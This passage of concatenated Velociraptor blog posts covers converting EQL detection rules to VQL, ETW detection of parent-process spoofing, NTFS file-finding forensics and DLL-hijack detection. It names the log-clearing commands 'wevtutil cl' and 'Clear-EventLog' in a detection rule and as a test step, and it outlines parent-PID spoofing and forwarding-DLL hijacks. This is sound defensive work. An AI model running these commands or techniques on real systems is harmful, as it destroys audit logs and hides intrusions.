Let's take a look at the produced VQL

```vql
LET SysmonGenerator = generate(name="Sysmon",
query={
  SELECT * FROM foreach(row={SELECT FullPath FROM glob(globs=EVTXGlob)},
     query={
      SELECT *
      FROM parse_evtx(filename=FullPath)
    })
}, delay=500)

LET ProcessInfo = generate(name="ProcessInfo", query={
   SELECT *,
          basename(path=EventData.ParentImage) AS ParentImageBase,
          basename(path=EventData.Image) AS ImageBase,
          commandline_split(command=EventData.CommandLine) AS CommandArgs,
          get(item=ProcessTypes, field=str(str=System.EventID.Value)) AS event_type
   FROM SysmonGenerator
   WHERE System.EventID.Value in (1, 5)
})

LET ProcessTypes <= dict(`1`="start", `5`="stop")

LET _ClearingWindowsEventLogs = SELECT 'Clearing Windows Event Logs' AS Detection,
       EventData.User AS User,
       EventData.CommandLine AS CommandLine,
       EventData.ParentImage AS ParentImage,
       EventData.Image AS Image,
       EventData.UtcTime AS UtcTime,
       EventData || UserData AS _EventData,
       System AS _System
FROM ProcessInfo
WHERE  (  ( event_type IN ('process_started', 'start' )
  AND  ( ImageBase =~ '^wevtutil\\.exe$' OR EventData.OriginalFileName = 'wevtutil.exe' )
  AND CommandArgs =~ '^/e:false$|^cl$|^clear-log$' )  OR  ( ImageBase =~ '^powershell\\.exe$'
  AND CommandArgs =~ '^Clear-EventLog$' )  )

SELECT * FROM _ClearingWindowsEventLogs
```

The query is split into two main parts:

1. The `Provider` is a set of queries that extract Sysmon EVTX events
   ready for further filtering. In this case we just read the events
   from the EVTX files on disk.

2. The second part of the query implements the detection logic as
   expressed by the EQL query above.

Let's test this artifact on our test system that we used previously to
run the command `wevtutil.exe cl system`, I will first add the new
artifact to Velociraptor by simply copy/pasting the generated code as
a new artifact in the GUI

![Adding the new detection artifact](adding_new_artifact.png)

Now I will schedule the artifact for collection on my endpoint

![Collecting the new detection artifact](collecting_new_artifact.png)

And in literally seconds, I find the system that triggered the rule
and the command line that triggered it.

![Detecting with the new artifact](detecting_new_artifact.png)

To search a large number of hosts, I can start a hunt with this
artifact and in minutes find which of my hosts triggered the rule.

### Adding more rules

We have seen how the EQL translates to a VQL detection query, but what
if we have many rules? Lets convert the entire set of detection rules
into a single artifact.

```sh
$ python3 parser/eql2vql.py -p SysmonEVTXLogProvider ~/projects/detection-rules/rules/windows/* -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.Detection' with 165 detections
```

The new artifact applies all the detection queries simultaneously on
all rows from the EVTX files. Collecting it again we have found some
new detections!

![Detecting with the full set of rules](collecting_more_detections.png)


## Real time detections

Velociraptor's hunting capabilities make it a breeze for actively
searching for signed of past compromise on endpoints. However what
about real time alerting? It would be nice to receive immediate
notification when a detection rule is triggered.

Velociraptor supports real time [client monitoring]({{< ref
"/docs/client_monitoring/_index.md" >}}) via event queries. Event queries run
constantly on the endpoint receiving rows from events.

We have previously explored how Event Queries can be used for real
time monitoring and in particular how VQL can leverage [Event Tracing
for Windows]({{< ref
"/blog/2021/2021-08-18-velociraptor-and-etw/_index.md" >}}) (ETW).

### Using EQL detections with real time monitoring

The `eql2vql` project contains a second provider that reads Sysmon
events directly from ETW sources. This bypasses the windows event log
system completely, and applies the VQL directly on real time ETW
events.

```sh
$ python3 parser/eql2vql.py -p SysmonETWProvider ~/projects/detection-rules/rules/windows/defense_evasion_clearing_windows_event_logs.toml -o /tmp/detection_vql.yaml
Created artifact 'Windows.Sysmon.EventDetection' with 1 detections
```

{{% notice tip "Advantage of ETW" %}}

We have previously discussed how event logs can be [turned off or
disabled](/blog/2021/2021-01-29-disabled-event-log-files-a3529a08adbe/)
which would interfere with tools that rely on event logs
directly. However, ETW sources still work, even if the event log itself
is disabled.

{{% /notice %}}

This time we have used the `SysmonETWProvider` to source the Sysmon
events directly from Sysmon's ETW subsystem:

```vql
LET SysmonGenerator = generate(name="Sysmon",
query={
  SELECT dict(EventID=dict(Value=System.ID),
              Timestamp=System.TimeStamp) AS System,
         EventData
  FROM watch_etw(guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}')
  WHERE get(field="EventData")
}, delay=500)

--- Rest of query is exactly the same as before
```

The only difference here is that the artifact produced is a client
monitoring artifact so it can be installed on all clients permanently,
continuously monitoring their Sysmon event source for the same EQL
detections. As soon as an EQL rule matches, Velociraptor will emit a
single row and send it to the server.

![Real time detections](real_time_detections.png)


We can escalate such detections, through a number of mechanisms,
such as [Slack alerts]({{< ref
"/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/_index.md"
>}}), or escalate to an external case management tool like [The Hive
](https://wlambertts.medium.com/zero-dollar-detection-and-response-orchestration-with-n8n-security-onion-thehive-and-10b5e685e2a1). See [Server Monitoring]({{< ref "/docs/server_automation/server_monitoring/" >}}) for more information.

We can even use the resulting VQL artifact as a base for other queries
to provide further enrichment and response capabilities.

## The Velociraptor difference

In this blog post we discussed a current effort to port EQL detections
to Velociraptor. Being able to automatically convert EQL detection
rules into VQL allows us to apply these rules in a wider context - We
can hunt a large set of EVTX files for past compromise, or apply the
same rules in real time to allow the endpoint to autonomously detect
and response without needing to be online or connected to the SIEM.

The main premise of Velociraptor's value proposition is to `push the
processing to the endpoint`. Instead of feeding all events from
thousands of endpoints to a central location and then using a high
performance database to churn though thousands of events per second,
Velociraptor simply runs the VQL query **on each endpoint
independently** and forwards only those high value detections to the
server. This solution scales very well because each endpoint is doing
it's own independent detection and does not need to forward **all**
events to the server. What does get forwarded is a very high value
subset of events that typically indicate a successful detection!

## Conclusions and further work

We are still working on the EQL to VQL conversion engine. Currently
not all EQL syntax is fully converted to VQL yet so some detection
rules can not be converted. We hope that with time we build enough
coverage to make the conversion as accurate as possible.

Since VQL is a much more capable language with access to a lot more
data (since it is running on the endpoint), we hope to build more
accurate and powerful detection rules. For example by correlating
information from the filesystem, NTFS analysis, Yara scans, memory
analysis etc. These capabilities can build on the basic EQL detection
rules to help eliminate false positives. At the same time we can draw
on the existing body of work in detection rules available with EQL.

We decided to focus on EQL because it is fairly similar to VQL in
spirit (both are query languages) so the conversion is a little
easier. But there are other sources of threat intelligence such as Sigma
which also output to EQL! A good coverage of the EQL capabilities will
get us Sigma support as well.

I wanted to write about this effort and have the community help us in
testing, further suggestions and other contributions, even in this
very early stage.  If you would are interested in improving endpoint
detection technology, take Velociraptor for a spin! It is available on
[GitHub](https://github.com/Velocidex/velociraptor) under an open
source license. As always, please file issues on the bug tracker or
ask questions on our mailing list
velociraptor-discuss@googlegroups.com. You can also chat with us
directly on discord at https://www.velocidex.com/discord

---END OF FILE---

======
FILE: /content/blog/2021/2021-09-03-process-spoofing/_index.md
======
---
title: "ETW Part 2: Process Parent Spoofing"
description: |
   This post takes another look at Event Tracing for Windows and how it can be used to detect a common attacker subversion technique.

tags:
 - Detection
 - VQL
 - ETW

author: "Mike Cohen"
date: 2021-09-03
---

## Process Parent Spoofing

A lot of the current state of the art detection techniques rely on
process creation logs, and their implied parent/child
relationships. For example, many detection rules alert when Powershell
is launched from `WinWord.exe` as it typically indicates a macro has
started a powershell payload.

Many people are sometimes surprised to learn that on Windows
parent/child process relationship is not particularly reliable. Back
in 2009, Didier Stevens released a demo tool called
[SelectMyParent](https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/)
demonstrating a quirk of the Windows `CreateProcess` API that allows any
caller to simply spoof the parent process ID.  This is particularly
troublesome, especially when so much of the DFIR industry relies on
process tracing of parent/child call chain. Further, parent spoofing
does not require any special privileges and can be performed by
non-admin users as well.

Didier Stevens wrote about it again in 2017's post [That Is Not My
Child Process!](https://blog.didierstevens.com/2017/03/20/) where even
`Sysmon` and `Volatility memory analysis` are demonstrated to be
fooled by `SelectMyParent`!

If you thought this was an unknown technique, rest assured that most
attack tools integrate parent process spoofing already. For example
[Cobalt Strike](https://www.youtube.com/watch?v=DOe7WTuJ1Ac) has been
able to do this for a number of years now, and the technique is
actively used frequently to avoid behavioural detection.

How can one detect this kind of spoofing? I found it surprising that
there are no indicators that a process has been spoofed that can be
gathered from an already running process (If you know of any, please
let me know!). As Didier Stevens shows in his 2017 post above, even
memory analysis can not reveal the real parent of a process.

The only way to learn that a process parent has been spoofed is using
ETW, as outlined in the F-Secure post [Detecting Parent PID
Spoofing](https://blog.f-secure.com/detecting-parent-pid-spoofing/). Let's
play with this detection and see how effective it is.

### Spoofing Parent processes

I will use Didier's tool `SelectMyParent` to spoof `notepad.exe` as
being a child of `OneDrive.exe`. First I use the task manager to find
the Process ID of OneDrive and then start notepad with this as the
parent.

![Spoofing the parent of notepad](spoofing_notepad_parent.png)

On this system I have Sysmon installed, so I will find the process
creation event in the event viewer.

![Sysmon event log ID 1 of spoofed process](sysmon_spoofed.png)

It shows the parent process of notepad is `OneDrive.exe`!

Let's write a VQL query to detect this spoofing. According to the post
above, the provider to watch is the `Microsoft-Windows-Kernel-Process`
provider which has a GUID of
`{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}`. Since the provider emits a
lot of information about all processes in the system, I will initially
narrow down event to only those that have `notepad` somewhere in the
event data.

```vql
SELECT *
FROM watch_etw(guid="{22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716}")
WHERE serialize(item=EventData) =~ "notepad"
```

![VQL query that detects the spoofed process](spoofed_etw_query.png)

In the above query we can see the anomaly immediately! The process
that generated the EWT event is not the same as the process parent
pid!

This anomaly allows us to detect the spoofing behavior, now we just
need to enrich the event with extra detail of the real parent, the
spoofed parent etc. You can find the full VQL artifact on the [Velociraptor Artifact Exchange](https://docs.velociraptor.app/exchange/) [here](https://docs.velociraptor.app/exchange/artifacts/pages/windows.etw.detectprocessspoofing/)

![Searching the Artifact Exchange](artifact_exchange.png)

To add this artifact, I will navigate to the `View Artifacts` screen,
then click `Add an Artifact` button, then copy and paste the Artifact
definition from the exchange into the editor.

![Adding the custom artifact](adding_artifact.png)

Now I will add this artifact to all client's monitoring
configuration. I click the `Event Monitoring` screen in the GUI then
the `Update client monitoring table` button.

![Targeting all clients for monitoring](targetting_monitoring.png)

To add the new artifact to the client's monitoring table I will select
it in the next step.

![Selecting the artifact to monitor](add_monitoring_artifact.png)

As soon as the monitor table is updated, all clients will refresh
their configuration and start monitoring for spoofing. We can see this
by viewing the query logs in the event viewer GUI

![Viewing query logs for monitoring artifacts](monitoring_artifact_logs.png)

We can clearly see the client is installing some ETW sessions to
monitor the provider. We also see a message every few minutes to
remind us that the client is still monitoring for events. When an
event is detected, the client immediately forwards the event to the
server.

We can repeat our experiment and see the event generated by selecting
the `Raw Data` view in the GUI.

![Viewing hits on the server](monitoring_artifact_event.png)

Again we see the events in the timeline, but this time the row
contains all the enriched information, like the real identity of the
parent process!

## False Positives

After having this rule running for while you might notice some false
positives - legitimate cases of parent process spoofing include the
UAC prompt.

![False Positive of parent process spoofing](fp.png)

When elevating a command to "run as admin" the UAC prompt shows. Once
the prompt is approved, the UAC manager launches the target program
and spoofs the parent process.

Other cases of legitimate parent process spoofing include the Windows
Error Reporting.

I thought it would be interesting to see UAC elevations and program
crashes as well, so I did not filter those out.

## Conclusions

In this post we implemented a sophisticated ETW based detection rule
in VQL. We then wrote an artifact to encapsulate it and shared the
artifact over the `Velociraptor Artifact Exchange` for other members
of the community to use.

After adding the artifact to our deployment, we then issued the
monitoring query to all clients. When any client detected the spoofing
behavior, an event was sent to server in real time. We could then
utilize any escalation mechanism such as [escalation through
slack](https://docs.velociraptor.app/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/)
or a [The
Hive](https://wlambertts.medium.com/zero-dollar-detection-and-response-orchestration-with-n8n-security-onion-thehive-and-10b5e685e2a1).

The interesting thing about this approach is that the detection rule
is implemented on the endpoint itself. It is the endpoint that is
watching the ETW events directly and making the decision about the
anomalous nature of the event. Therefore the number of events actually
streamed to the server is very small - most events will be high value
events (such as real parent spoofing, UAC elevation and crashes).

Other Log forwarding technologies simply stream **all process creation
events** to a large backend server, where detection queries are
implemented in large data mining engines. This increases the volume of
irrelevant events forwarded to the server (most process execution
events are not malicious!), requiring more backend processing
capacity.

Velociraptor's approach is very different! Velociraptor moves the
initial analysis and triage to the end point, implemented via the
powerful VQL query language. This means we do not need a lot of
processing on the backend to scale to many thousands of monitored
endpoints, as the server only sees high value, low volume events. We
are essentially using the end point itself to create a de-centralized
detection engine for a fast and scalable alerting system.

Unfortunately an ETW watcher must be running at the time the process
is created, to be able to identify the spoofed parent. I am not
currently aware of a way to detect that an existing process's reported
parent is not correct (Please let me know if you know of a way!). This
means that simply collecting information at a point in time after the
process is started (as in a Velociraptor `pslist` hunt for example)
does not reveal this information easily.

In the next blog post in this series we will be looking at how ETW can
be abused by malware and some of the limitations around ETW.

If you have a great idea for a new detection query, take
[Velociraptor for a spin](https://github.com/Velocidex/velociraptor)!
It is a available on GitHub under an open source license. As always
please file issues on the bug tracker or ask questions on our mailing
list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

There is still time to submit it to this year's [2021 Velociraptor
Contributor
Competition](https://docs.velociraptor.app/announcements/2021-artifact-contest/),
where you can win prizes, honor and support the entire DFIR
community. Alternatively, you can share your artifacts with the
community on [Velociraptor's Artifact
Exchange](https://docs.velociraptor.app/exchange/).

---END OF FILE---

======
FILE: /content/blog/2021/2021-04-21-the-next-phase-of-velociraptor-bf696c2c3491/_index.md
======
---
title: The Next Phase of Velociraptor
description: Velociraptor is now part of Rapid7 - read about the transition and future plans.
date: 2021-04-21
---

We’ve made great strides on our journey to make the Velociraptor vision come true. We’ve built an open-source Velociraptor to help users deploy a world-class tool for endpoint monitoring, digital forensics, and incident response. Today, I am happy to announce our new home with Rapid7.

Boston-based **Rapid7,** **provider of security analytics and automation, has acquired the Velociraptor open-source technology and community**. Rapid7 shares our vision and will help us continue to achieve it. We’re gaining a great partner in Rapid7 on this journey.

In the many years I’ve been in cybersecurity — including time at Australian Signals Directorate (currently known as [ACSC](https://www.cyber.gov.au/)), the [Australian Federal Policy](https://www.afp.gov.au/what-we-do/crime-types/cyber-crime), and Google’s DFIR team — I’ve learned that digital forensics and incident response (DFIR) is a unique field. Defenders are typically at a disadvantage for a few reasons:

* **Attackers only need one of the many possible avenues to compromise the network**, while defenders have to cover all avenues effectively.

* **Defenders have to detect more attacks on the endpoint** as organizations expand their environments beyond the network perimeter to interconnected systems on the internet.

* **New vulnerabilities are being discovered almost daily** and attack tools like ransomware are designed to extract maximum damage from victims (in the good old days, the worst an attacker might achieve is a defaced website!).

* **Building out DFIR capabilities requires specialized knowledge and skills** in the intricacies of operating systems, web technologies and networking just to understand the advisories, let alone to detect breaches on the network.

Velociraptor was born from these observations. As an open-source developer and contributor for many years, it became clear to me that the way forward lies in open source and, more importantly, the ability of open source to bring together a community of users and developers. No one person, team or company can cover the entire DFIR field quickly and sufficiently enough. It is clearly a task for a community effort!

I also observed that existing open-source tools required a high-level of development skills to contribute code, and had a long release/deployment cycle. Velociraptor’s unique approach is to provide powerful building blocks accessible through a simple query language called VQL. Having an intermediate query language as the mechanism to write new detection, collection and analysis capabilities in Velociraptor facilitates the following goals:

* **VQL must be simpler to learn than a full-featured programming language** to lower the barrier to entry for prospective contributors. In many cases, VQL can be tweaked from existing queries to cover novel detection or analysis techniques using primitives already available in Velociraptor (like NTFS analysis) but combined in novel ways.

* **VQL must be able to be deployed quickly.** Since VQL queries can be added at runtime without the need to rebuild or re-deploy endpoint software, they can be used instantly to hunt for new indicators in minutes.

The Velociraptor vision is that VQL queries are the medium of information sharing and exchange between DFIR experts, researchers, and the users who are desperately trying to determine if their networks are compromised.

Attack methods are becoming more sophisticated all the time, and the techniques required to detect these go far beyond simple hashes, event log forwarding, and Yara signature of current technology. Techniques such as analysis of evidence of execution, low-level NTFS artifacts, parsing process memory and various artifacts left behind on disk are now required to reconstruct the attack timeline for effective detection and remediation. It is clear that Velociraptor needs to provide access to these advanced analysis techniques to enable sophisticated novel detection at scale on the endpoint.

**A new partnership**

I am very excited that Rapid7 shares our community’s vision and will help us achieve it. The one aspect I was really excited about is Rapid7’s commitment to open source and track record of responsible stewardship. The company created an open-source community of its own with [AttackerKB](https://attackerkb.com/), a community-driven platform where security professionals exchange information about vulnerabilities to better understand the impact and likelihood of being exploited. And Rapid7 has been shepherding and supporting the [Metasploit](https://www.metasploit.com/) Project, which it acquired nearly a dozen years ago.

The Metasploit Project is still one of the most consistently active open-source security projects and communities in the world. Rapid7 recognizes the immense value of ongoing collaboration between the community and the Metasploit open-source team, and the company has continued to invest in and nurture Metasploit. In return, the Metasploit community has built trust with Rapid7. Under Rapid7’s stewardship, the Metasploit Project continues to grow, thrive, and evolve.

There is a great synergy between Metasploit — the standard red team framework — and Velociraptor — the standard blue team platform. When a new vulnerability or exploit is published, the Metasploit project implements a module targeting it within days. Imagine a Velociraptor VQL query being published within a similar timeline! Rapid7 is a natural choice for nurturing and drawing from the collective knowledge of both red and blue teams.

Much like Rapid7 has done for Metasploit, the company is committed to building the Velociraptor community. I will be joining Rapid7 to continue leadership and support of the community — with all of the resources of Rapid7 to back me up — so, together, we may improve the state of blue teaming and defense.

Rapid7 also has a vibrant services team that experiences daily the cybersecurity breaches that we are trying to defend against. Having practical, hands-on exposure to current and emerging threats places Rapid7 in the unique position of contributing and supporting Velociraptor — thereby feeding a lot of the practical, real-world experience to the community in the form of effective, well-tested VQL queries. Additionally, integrating Velociraptor into a large-scale detection capability will provide the impetus to develop a highly scalable Velociraptor server that’s able to serve a large number of endpoints efficiently.

Rapid7’s commitment to the future of the Velociraptor community will ensure that Velociraptor is well-known globally. With conference appearances and community events, Rapid7 will promote the tool, grow the community, increase the types of users, and cater to a wider set of needs. This will benefit the entire community, as Velociraptor’s capabilities are improved.

Rapid7 will enable Velociraptor to graduate to the “next level” in terms of scale, development velocity, stability and capability by drawing on a wide-range of capable and experienced people to support the project. I am very excited to see the Velociraptor vision coming true.

There are no plans to commercialize Velociraptor. However, the Managed Detection and Response teams at Rapid7 will immediately leverage Velociraptor and insights from the community to enhance its incident response capabilities for customers. Further, integration of Velociraptor’s endpoint data collection capabilities with Rapid7’s Insight agent will greatly increase Rapid7’s endpoint visibility and detection capabilities and deliver immediate benefits to its customers.

Finally, dear reader, if you also share our vision for a powerful and free open-source platform to enable blue-teamers to quickly hunt, detect, and remediate novel threats, consider joining our community. Download Velociraptor from [GitHub](https://github.com/Velocidex/velociraptor), kick the tires, and provide feedback.

**Check out the [blog](https://www.rapid7.com/blog/post/2021/04/21/rapid7-and-velociraptor-join-forces) Rapid7 posted** about their commitment to supporting this community.

---END OF FILE---

======
FILE: /content/blog/2021/2021-02-13-digging-for-files-with-velociraptor-a1c0a21e242b/_index.md
======
---
title: Digging for files with Velociraptor
description: The post covers a number of ways to find filesystem artifacts.
tags:
- Forensics
- Windows
- Filesystems
date: 2021-02-13
---


One of the most common questions in digital forensics is:

```text
Is a file with a specific filename currently present on this system or was it in the past?
```

There are many scenarios that lead to this question, from theft of IP by rogue employees, to drive by downloads from malicious websites or even victims of phishing emails. Often we need to scope this question to the entire network (Which machines had this file?) or potentially 10s of thousands endpoints.

This post recounts some of the techniques we can use within Velociraptor to answer this question. Most of these techniques should be very familiar to DFIR practitioners, but we will discuss how they are implemented in Velociraptor specifically.

For this post I will create a text file with a unique name Abagnale.txt and I will attempt to find it on my test system.

![](../../img/1u0_dhIcf9zdcRdO0x1rAdw.png)

### Searching for files using Windows.Search.FileFinder

The first artifact we can use to search for files is the aptly named FileFinder artifact (There are variants for Linux/MacOS and Windows). I will simply add a new collection, search for the file finder and select the `Windows.Search.FileFinder`.

![](../../img/1YD4Zee8PdP8nw3b-mcFDeQ.png)

Next I will configure the artifact parameters.

![](../../img/13ebC-8_xkdROGTsmuCoreg.png)

The FileFinder artifact uses a glob expression to find files through the filesystem. A glob expression uses simple wildcards to match files by filename. In Velociraptor a `**` glob expression means recursively descend into subdirectories, so in our case the glob expression `C:\**\Abagnale*` will enumerate all files in the C: drive to locate the file of interest.

![](../../img/1xW9fQn8L_pKG5SgTvencrA.png)

Globbing through all files took 109 seconds on my test VM and returned two hits (my original text file and a lnk file created by notepad itself):

![](../../img/1Udz5uUX3NEzT4mY-757ajw.png)

### Scanning the Master File Table

On Windows, the NTFS filesystem is almost ubiquitous. NTFS uses a special hidden file called the $MFT to store all metadata on all files (such as their filenames, size, dates etc). Metadata is stored in the $MFT within MFT entries — fixed size data structures stored back to back in the $MFT file.

Therefore, by scanning the $MFT file and parsing all MFT entries, we are able to enumerate all files’ metadata on the disk.

Velociraptor offers an artifact called `Windows.NTFS.MFT` that will enumerate all entries within the $MFT filtering out only the relevant ones.

![](../../img/1l-xgDXReDeWyKK_A7wAm9w.png)

I will again proceed to configure the artifact parameters. This time I am able to filter the filename by a regular expression. I will just search for all files with filenames containing the word **Abagnale** .

![](../../img/1zoTSgpXbFFktbI-b14k9fg.png)

Again this artifact found the same 2 files as the previous one

![](../../img/1EB6S8u1baKQ2h7Qv4bTpww.png)

So how is the MFT search method different from the Glob method?

Parsing the MFT tends to be faster than using the APIs in a glob when searching over the entire disk (87 sec vs 109 sec), although if you know that the files can only be in a more confined part of the disk (e.g. inside the C:\Users directory) then the glob method is faster since it is looking at fewer files.

However, the MFT search may be able to detect deleted files. When a file is deleted in NTFS the MFT entry is marked as unallocated and can be reused at any time, but until it does, the old data structures are still present and will be parsed by the MFT parser.

Additionally the MFT parser has access to the **$FILENAME** stream’s timestamps and so can report those as well. Timestamps in the **$FILENAME** streams (Shown in the above results as Created0x30, LastModified0x30 etc) can not be altered by timestomping tools and so are more reliable indicators of when the file was created or modified.

### Searching the USN journal

While the previous two methods were great for detecting files that are currently present on the endpoint, what if the file was since deleted? I mentioned that the MFT parser may still find evidence of a deleted file in unallocated MFT entries, but this will only happen if the entry is not reused by the system for something else.

Luckily, Windows keeps another record of file operations in the NTFS USN journal. I wrote in details previously about [the USN journal](https://medium.com/velociraptor-ir/the-windows-usn-journal-f0c55c9010e) but for our purposes it is sufficient to know that file operations are continuously written by the system into a journal file internal to the NTFS filesystem (so it is not generally altered by adversaries).

Velociraptor contains a built-in parser for the USN journal which is made available via the `Windows.Forensics.Usn` artifact. I will select this artifact for collection as before

![](../../img/1-hox0Mi6qUTpbkIsrGjKMQ.png)

I now select “Configure Parameters” where I can specify a path regular expression.

![](../../img/1E4JaMVWTzWPB7ghefsKOZQ.png)

This time the artifact returns 7 rows in 29 seconds

![](../../img/1nvuwmAxUDjDOC1V2Abwopg.png)

Let’s take a look at the rows returned from this query

![](../../img/1qkHHGevfBzluJPeTcHBlSw.png)

Since the USN journal stores metadata about file operations, we see each time the file was interacted with by a program. This is not exactly the same as the previous results which just show the final state of the file.

For example, if the file was edited at one point in time and then edited again at a later time, the USN journal will show 2 separate interactions with the file, but the previous artifacts will only show the last modified time. This can be significant for some investigations, in particular if the file is deleted.

Typically we find the USN journal is kept for around 2–3 weeks by the system, providing excellent visibility of past activities.

### Hunting the entire network

Previously we collected the artifacts on a single host. However, in some investigations we need to determine if any machine in our network contains the file in question.

Velociraptor hunts are specifically designed to coordinate collections of the same artifact across the entire fleet. I will create a new hunt and give it a description, then proceed to select the `Windows.Forensics.Usn` artifact configuring its parameters as before.

![](../../img/1pV6gUITH1IO1rCM2ok28ug.png)

Running the hunt over a small network returns results within minutes

![](../../img/1ivnEtqt-UnZG2kUldMdScA.png)

While it may seem that a USN journal scan of an entire network is an expensive operation, in reality it places very little load on the server.

The server simply collects the result sets from running the VQL query across each endpoint in the deployment. Since these artifacts are highly targeted in returning only positive hits for the files in question the total number of rows returned is pretty small. In this hunt, most of the heavy lifting is done by the endpoints themselves — this is the secret for Velociraptor’s scalability!

### Conclusions

In this post we looked at some of the common ways to determine if a file was present on a system. Each method has advantages and disadvantages and this article explored when you should use one method over another. You can of course, just use all methods at the same time, and interpret their results accordingly.

All the described methods are very quick ranging from under 30 seconds for a USN journal scan, to a couple of minutes for a large glob operation. Using Velociraptor we can perform an exhaustive search of a large 10–20k endpoint deployment in minutes. This unprecedented agility and scalability is rather unique in an open source DFIR tool.

To play with these artifacts yourself, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at [https://www.velocidex.com/training/](https://www.velocidex.com/training/).

---END OF FILE---

======
FILE: /content/blog/2021/2021-02-02-detecting-dll-hijacking-with-vql-e9a735354257/_index.md
======
---
title: Detecting DLL Hijacking With VQL
description: |
  Let's develop some VQL to detect common DLL hijacking on Windows.
tags:
- Windows
- VQL
date: 2021-02-02
---

One of my favorite pastime is reading Twitter and following other security researchers. I love being able to see a new tool or technique and develop an understanding and detections for it. A while back, I was reading my feed and saw an excellent article titled [I Like to Move It: Windows Lateral Movement Part 3: DLL Hijacking](https://www.mdsec.co.uk/2020/10/i-live-to-move-it-windows-lateral-movement-part-3-dll-hijacking/).

The article describes an interesting form of lateral movement — DLL Hijacking. DLL Hijacking is an abuse of the Windows DLL search order resolution process. Typically, when an executable is started, the executable will declare dependent DLLs in its import table. Windows will search for these DLLs in a number of paths, until a suitable DLL is found, and its exported symbols will be resolved into the new image. DLL Hijacking works by placing a malicious DLL, with the same name as a legitimate DLL, in a directory that is searched earlier, thereby tricking the loader into loading the malicious DLL instead of the legitimate one.

DLL Hijacking is often used for persistence — simply place a malicious DLL earlier in the search path, and programs that are started (potentially with higher privileges) will load the malicious DLL, thereby granting execution.

In the above article an interesting approach is described to escalate privileges or laterally move to a remote system — simply write a malicious DLL using e.g. SMB on the target machine, and wait until a user or process on the remote machine runs the vulnerable program.

Actually getting DLL hijacking to work successfully is [quite tricky](https://silentbreaksecurity.com/adaptive-dll-hijacking/). The details are described well by Nick Landers in [Adaptive DLL Hijacking](https://silentbreaksecurity.com/adaptive-dll-hijacking/) which presents a number of approaches.

One of the simplest technique, is to simply create a DLL with a bunch of forwarded functions. Normally a DLL contains an *Export Table*, listing all the functions it exports. However sometimes, the need arises to legitimately forward an export that would normally be found in one DLL to another DLL (e.g. in the case where a DLL was refactored this allows replacing the dll without rebuilding programs that depend on it).

In this case, the export table contains a forward entry — i.e. it forwards the loader into another DLL. Nick Landers published a tool to help build such a dll [https://github.com/monoxgas/Koppeling](https://github.com/monoxgas/Koppeling)

### Example Injection

I will use the Koppeling tool above to build a simple DLL forwarder as per the example in the repository.

![](../../img/1MDCiispLQZwNTqreGTQ_CQ.png)

![](../../img/1w0xeBExcn4m06ja_HLFGIg.png)

### Parsing the DLL

Velociraptor has a function that allows parsing a PE file, lets see what information is available — Simply use parse_pe() on the injection file.

![](../../img/1jogu19VYVVVeL98TDKZHNQ.png)

We see that although the file is called **wkscli.dll** it really is **kernel32.dll** (since we have modified its exports to forward to the original wkscli.dll residing in C:\Windows\System32).

While it is normal for a dll to forward to another dll, it is very unusual for a dll to forward to **another dll of the same name**. So I think a strong signal for a potentially hijack dll is one that contains forwards to another dll with the same base name.

As usual I created a Velociraptor notebook and developed the VQL within it. The full query I entered in the notebook cell is shown below:

<script src="https://gist.github.com/scudette/9a4aff9186028243e7b65da89ef538ad.js" charset="utf-8"></script>

1. First I search for all DLL files in the provided glob (excluding **winsxs** and **servicing** directory). I also lowercase the name of the dll and strip the extension.

1. For each DLL I parse out the forwarded functions and use a regular expression to split the string into a target DLL and an exported function.

1. I then filter all rows to show only those with the target DLL the same as the name of the dll itself.

### Testing the VQL

I copied the hijack DLL I created with [Koppeling](https://github.com/monoxgas/Koppeling) into the Windows directory. I then created an artifact and collected it on my VM. I chose to recursively scan all dlls in the windows directory to get an idea of the performance impact.

![](../../img/1Fcsrla6Y1rQFyBThJ-APsg.png)

Velociraptor reports all forwarded functions that target a DLL with the same name as the one it is currently parsing. Velociraptor parsed about 9000 Dlls and took 62 seconds to find the one injection dll and one false positive (C:\Windows\SysWOW64\rpcrt4.dll).

### Conclusions.

This quick VQL is only suitable to detect one type of DLL hijack — one using forwarded functions. There are many other types of hijacking which might be more difficult to detect (more are discussed in the paper above). It is also possible to detect dll injection after the fact (by looking at loaded DLLs in process memory images), but this query is looking for “time bombs” — simply files that stay on the endpoint until a time in the future where they allow reinfection or escalation.

In this exercise we went from a blog post and a POC tool to a detection artifact in a short time, and were able to easily deploy and subsequently hunt for these.

The above example is just one of the exercises we do in our hands on Velociraptor courses. If you are interested in learning more about Velociraptor, check out our hands on training courses on [https://www.velocidex.com/training/](https://www.velocidex.com/training/) or check out the code on [GitHub](https://github.com/Velocidex/velociraptor). To chat, please join us on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord).

---END OF FILE---

======
FILE: /content/blog/2021/2021-02-03-migrating-from-osquery-to-velociraptor-d4143799953f/_index.md
======
---
title: Migrating from OSQuery to Velociraptor
description: Many new Velociraptor users have existing OSQuery queries and installations and are migrating to Velociraptor for powerful and efficient endpoint visibility. This post summarizes some of the differences between Velociraptor and OSQuery.
tags:
- OSQuery
date: 2021-02-03
---

## Tips for the journey

[OSQuery](https://osquery.io/) has been around for a while now, and
was actually the initial inspiration for Velociraptor. Back in the
day, it became clear to me that the way to provide unprecedented
flexibility for endpoint visibility was to have a flexible and
powerful query language. OSQuery was historically a proof that a
powerful query language was the way forward, and VQL was designed to
improve on OSQuery and push the state of the art.

Many new Velociraptor users have existing OSQuery queries and
installations and are migrating to Velociraptor for powerful and
efficient endpoint visibility. I have written [previously about
Velociraptor’s OSQuery
